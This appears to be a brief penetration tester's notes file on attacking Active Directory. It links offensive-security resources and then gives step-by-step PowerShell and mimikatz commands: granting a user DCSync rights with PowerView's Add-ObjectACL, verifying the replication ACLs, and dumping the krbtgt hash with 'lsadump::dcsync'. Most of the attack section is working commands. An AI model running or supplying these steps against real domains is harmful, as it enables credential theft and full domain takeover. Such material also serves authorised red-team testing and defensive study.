# Resources

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-powerview  

https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/

https://www.varonis.com/blog/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/

### [PowerView.ps1]

https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview

### [Dumping credentials from the domain controller with DCSync]

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync


1. Import the module
```
import-module .\PowerView.ps1
```

2. Add DCSync rights to user
```
Add-ObjectACL PrincipalIdentity user -Rights DCSync
```

3. Import Active Directory
```
Import-Module ActiveDirectory
```

4. Retrieve the permissions for user
```
(Get-Acl "ad:\dc=DOMAIN,dc=COM").Access | ? {$_.IdentityReference -match 'user' -and ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) }
```

5. Use mimikatz to dump credentials
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md

```
lsadump::dcsync /user:krbtgt
```
